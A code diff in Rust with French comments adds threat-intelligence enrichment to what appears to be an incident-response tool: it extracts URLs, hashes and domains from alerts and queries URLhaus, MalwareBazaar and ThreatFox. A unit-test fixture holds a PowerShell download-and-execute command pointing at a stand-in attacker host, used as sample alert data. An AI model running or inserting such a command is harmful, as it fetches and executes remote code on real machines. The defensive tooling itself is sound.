@@ -424,13 +424,133 @@ async fn load_skill_api_key(store: &dyn Database, skill_id: &str) -> Option<Stri
     }
 }
 
-/// Pour les threat intel matches (URLs, hashes) — actuellement skip parce que
-/// les findings du dossier n'exposent pas systématiquement ces champs. À étendre
-/// dans une itération future quand le dossier portera les IOCs extraits.
+/// Plafond d'IoC (URL+hash+domaine) enrichis par dossier — borne le coût
+/// réseau et la latence sur un dossier bruyant.
+const MAX_IOCS_PER_DOSSIER: usize = 10;
+
+/// Collecte les IoC (URL / hash / domaine) présents dans le dossier, en
+/// extrayant des `matched_fields` des alertes Sigma, des `metadata` des
+/// findings, et des `dga_domains` déjà détectés. Pur (pas d'I/O) → testable.
+/// Les IPs sont volontairement ignorées ici : elles ont leur propre enricher
+/// (`enrich_ip_reputations`).
+fn collect_dossier_iocs(
+    dossier: &IncidentDossier,
+) -> crate::enrichment::ioc_extractor::ExtractedIocs {
+    let mut acc = crate::enrichment::ioc_extractor::ExtractedIocs::default();
+    for a in &dossier.sigma_alerts {
+        let e = crate::enrichment::ioc_extractor::extract_from_json(&a.matched_fields);
+        acc.urls.extend(e.urls);
+        acc.hashes.extend(e.hashes);
+        acc.domains.extend(e.domains);
+    }
+    for f in &dossier.findings {
+        let e = crate::enrichment::ioc_extractor::extract_from_json(&f.metadata);
+        acc.urls.extend(e.urls);
+        acc.hashes.extend(e.hashes);
+        acc.domains.extend(e.domains);
+    }
+    for d in &dossier.ml_scores.dga_domains {
+        acc.domains.insert(d.clone());
+    }
+    acc
+}
+
+/// Mappe un hit ThreatFox vers le modèle `ThreatIntelMatch` du dossier.
+fn threatfox_to_match(t: crate::enrichment::threatfox::ThreatFoxIoc) -> ThreatIntelMatch {
+    ThreatIntelMatch {
+        indicator: t.ioc_value,
+        indicator_type: match t.ioc_type.as_str() {
+            x if x.contains("url") => "url".into(),
+            x if x.contains("domain") => "domain".into(),
+            x if x.contains("ip") => "ip".into(),
+            x if x.contains("md5") || x.contains("sha") => "hash".into(),
+            other => other.to_string(),
+        },
+        source: "threatfox".into(),
+        threat_type: t.threat_type,
+        malware: t.malware,
+        confidence: t.confidence_level.unwrap_or(50),
+    }
+}
+
+/// Enrichit le dossier avec la threat-intel sur les IoC URL/hash/domaine :
+/// URLhaus (URLs), MalwareBazaar (hashes), ThreatFox (tous). Seuls les HITS
+/// (IoC connus malveillants) sont retenus — un IoC inconnu n'ajoute pas de
+/// bruit. Chaque lookup est borné par un timeout : une source injoignable ne
+/// bloque jamais la construction du dossier (le bundle reste valide, partiel).
 async fn enrich_threat_intel(_store: &dyn Database, dossier: &mut IncidentDossier) {
-    let matches: Vec<ThreatIntelMatch> = Vec::new();
-    // Placeholder pour Phase ultérieure : URLhaus / MalwareBazaar lookups
-    // sur les indicateurs URL/hash extraits des findings.
+    use std::time::Duration;
+    let iocs = collect_dossier_iocs(dossier);
+    let mut matches: Vec<ThreatIntelMatch> = Vec::new();
+    let to = Duration::from_secs(5);
+
+    // URLs → URLhaus (curé) + ThreatFox.
+    for url in iocs.urls.iter().take(MAX_IOCS_PER_DOSSIER) {
+        if let Ok(Ok(Some(r))) =
+            tokio::time::timeout(to, crate::enrichment::urlhaus::lookup_url(url, None)).await
+        {
+            matches.push(ThreatIntelMatch {
+                indicator: r.url,
+                indicator_type: "url".into(),
+                source: "urlhaus".into(),
+                threat_type: r.threat.unwrap_or_else(|| "malware_url".into()),
+                malware: None,
+                confidence: 80,
+            });
+        }
+        if let Ok(Ok(hits)) =
+            tokio::time::timeout(to, crate::enrichment::threatfox::lookup_ioc(url, None)).await
+        {
+            matches.extend(hits.into_iter().map(threatfox_to_match));
+        }
+    }
+
+    // Hashes → MalwareBazaar + ThreatFox.
+    for hash in iocs.hashes.iter().take(MAX_IOCS_PER_DOSSIER) {
+        if let Ok(Ok(Some(m))) = tokio::time::timeout(
+            to,
+            crate::enrichment::malware_bazaar::lookup_hash(hash, None),
+        )
+        .await
+        {
+            matches.push(ThreatIntelMatch {
+                indicator: m.sha256,
+                indicator_type: "hash".into(),
+                source: "malwarebazaar".into(),
+                threat_type: "malware".into(),
+                malware: m.signature,
+                confidence: 90,
+            });
+        }
+        if let Ok(Ok(hits)) =
+            tokio::time::timeout(to, crate::enrichment::threatfox::lookup_ioc(hash, None)).await
+        {
+            matches.extend(hits.into_iter().map(threatfox_to_match));
+        }
+    }
+
+    // Domaines → ThreatFox.
+    for dom in iocs.domains.iter().take(MAX_IOCS_PER_DOSSIER) {
+        if let Ok(Ok(hits)) =
+            tokio::time::timeout(to, crate::enrichment::threatfox::lookup_ioc(dom, None)).await
+        {
+            matches.extend(hits.into_iter().map(threatfox_to_match));
+        }
+    }
+
+    // Dédup (indicator + source) — ThreatFox peut renvoyer le même IoC qu'URLhaus/MB.
+    matches.sort_by(|a, b| {
+        (a.indicator.as_str(), a.source.as_str()).cmp(&(b.indicator.as_str(), b.source.as_str()))
+    });
+    matches.dedup_by(|a, b| a.indicator == b.indicator && a.source == b.source);
+
+    if !matches.is_empty() {
+        tracing::info!(
+            "DOSSIER_ENRICHMENT: {} threat-intel match(es) sur les IoC du dossier #{}",
+            matches.len(),
+            dossier.id
+        );
+    }
     dossier.enrichment.threat_intel = matches;
 }
 
@@ -638,6 +758,38 @@ mod tests {
             created_at: Utc::now(),
             username: None,
         }
+    }
+
+    #[test]
+    fn collect_dossier_iocs_extracts_url_hash_domain() {
+        // URL + sha256 dans les matched_fields d'une alerte ; domaine via finding.
+        let mut alert = mk_alert_with_ip(1, Some("8.8.8.8"));
+        alert.matched_fields = serde_json::json!({
+            "CommandLine": "powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')",
+            "Hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        });
+        let mut finding = mk_finding_no_cve(2);
+        finding.metadata = serde_json::json!({ "domain": "malware-c2.example.net" });
+        let dossier = mk_dossier(vec![finding], vec![alert]);
+
+        let iocs = collect_dossier_iocs(&dossier);
+        assert!(
+            iocs.urls.iter().any(|u| u.contains("evil.example.com")),
+            "URL doit être extraite des matched_fields, got {:?}",
+            iocs.urls
+        );
+        assert!(
+            iocs.hashes
+                .iter()
+                .any(|h| h.contains("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")),
+            "le SHA256 doit être extrait, got {:?}",
+            iocs.hashes
+        );
+        // Les IPs ne sont PAS collectées ici (enricher dédié).
+        assert!(
+            iocs.ips.is_empty(),
+            "collect_dossier_iocs ne doit pas collecter d'IP (enrich_ip_reputations s'en charge)"
+        );
     }
 
     fn mk_dossier(findings: Vec<DossierFinding>, alerts: Vec<DossierAlert>) -> IncidentDossier {
